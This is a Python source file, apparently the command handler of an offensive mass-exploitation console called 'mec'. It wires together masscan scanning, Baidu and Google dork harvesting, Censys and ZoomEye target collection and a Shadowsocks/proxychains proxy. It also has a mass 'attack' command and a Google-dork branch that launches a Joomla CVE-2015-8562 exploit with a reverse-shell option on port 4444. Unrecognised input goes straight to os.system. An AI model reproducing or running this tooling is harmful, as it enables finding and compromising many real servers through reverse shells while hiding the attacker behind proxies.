#!/usr/bin/python3
# pylint: disable=too-few-public-methods,too-many-instance-attributes,too-many-statements,too-many-branches,too-many-locals,too-many-nested-blocks,broad-except

'''
handles user commands
'''
import os
import subprocess
import sys

from lib.cli import colors, console, futil
from lib.tools import baidu, censys, scan, zoomeye


def cmd_handler(session, cmd):
    '''
    handles user input in console
    '''

    # lol i don't want any errors here
    cmd = str(cmd).lower().strip()

    if cmd == '':
        return

    if cmd == "masscan":
        # check root, as masscan requires root privilege

        if os.geteuid() != 0:
            console.print_error(
                "[-] Please run mec as root in order to run masscan")

            return

        ports = console.input_check(
            "[?] What ports do you want to scan (eg. 80 443)? ").split()

        try:
            scan.masscan(ports)
        except KeyboardInterrupt:
            console.print_warning("[-] masscan exited")
    elif cmd == 'info':
        if session.shadowsocks.is_usable():
            session.proxy_status = "OK"
        colors.colored_print(
            f'''
session
-------

[*] Current directory: {os.getcwd()}
[*] Root directory: {session.init_dir}
[*] Log file: {session.logfile}
[*] Target: {session.ip_list}

PROXY
-----

[*] Shadowsocks config: {session.shadowsocks.ss_url}
[*] Shadowsocks local port: {session.shadowsocks.local_port}
[*] Shadowsocks connectivity: {session.proxy_status}
''',
            colors.CYAN)

    elif cmd.startswith('target'):
        target = ''.join(cmd.split()[1:])

        if target not in os.listdir(session.init_dir + '/data'):
            console.print_error("[-] Target file not found")

            return
        colors.colored_print(
            '[i] Target changed to {}'.format(target), colors.BLUE)
        session.ip_list = session.init_dir + \
            '/data/' + target

    elif cmd in ('init', 'i'):
        colors.colored_print('[*] Going back to init_dir...', colors.BLUE)
        os.chdir(session.init_dir)

    elif cmd.startswith('baidu'):
        try:
            command = cmd.strip().split()
            dork = command[1]
            count = int(command[2])
            os.chdir(session.out_dir)
            colors.colored_print('[*] Searching on Baidu...', colors.PURPLE)
            baidu.spider(dork, count)

            if console.yes_no("Use collected URL's as target?"):
                session.ip_list = session.init_dir + "result.txt"

        except (IndexError, EOFError, KeyboardInterrupt, SystemExit):
            return

    elif cmd == 'proxy':
        session.shadowsocks.start_ss_proxy()

        # write proxy.conf
        proxyconf = open(session.proxy_conf, "w+")
        proxyconf.write(session.proxychains_conf)
        proxyconf.close()

        # set proxy_status
        session.proxy_status = "DISCONNECTED"

    elif cmd == 'redis':
        console.print_error('[-] Under development')

    elif cmd.startswith('google'):
        try:
            cmd = cmd.strip().split()
            dork = cmd[1]
            # well yes im a lazy guy
            subprocess.call(['./exploits/joomla/joomlaCVE-2015-8562.py',
                             '--dork', dork,
                             '--revshell=\'127.0.0.1\'',
                             '--port=4444'])
        except BaseException as err:
            console.print_error(str(err))
            console.debug_except()

    elif cmd in ('q', 'quit'):
        futil.check_kill_process('ss-proxy')
        sys.exit(0)

    elif cmd in ('h', 'help', '?'):
        print(console.HELP_INFO)

    elif cmd == 'exploits':
        colors.colored_print('[+] Available exploits: ', colors.CYAN)

        for poc in futil.list_exp():
            colors.colored_print(poc, colors.BLUE)

    elif cmd in ('z', "zoomeye"):
        try:
            console.print_warning(
                "[*] ZoomEye now asks for phone verification (+86 only)")
            zoomeye.run()
        except (EOFError, KeyboardInterrupt, SystemExit):
            pass
        except BaseException:
            console.debug_except()
    elif cmd == "censys":
        try:
            output = censys.start()

            if console.yes_no("Use collected URL's as target?"):
                session.ip_list = session.init_dir + "/" + output
                colors.colored_print(
                    '[i] Target changed to {}'.format(
                        session.ip_list), colors.BLUE)

        except BaseException:
            return
    elif cmd in ('x', 'reset'):
        os.system("reset")

    elif cmd in ('c', 'clear'):
        os.system("clear")

    elif cmd in ("attack", "e"):
        session.attack()

    else:
        try:
            print(
                colors.BLUE +
                colors.BOLD +
                "[*] Exec: " +
                colors.END,
                colors.GREEN +
                cmd, colors.END)
            os.system(cmd)
        except (EOFError, KeyboardInterrupt, SystemExit):
            return
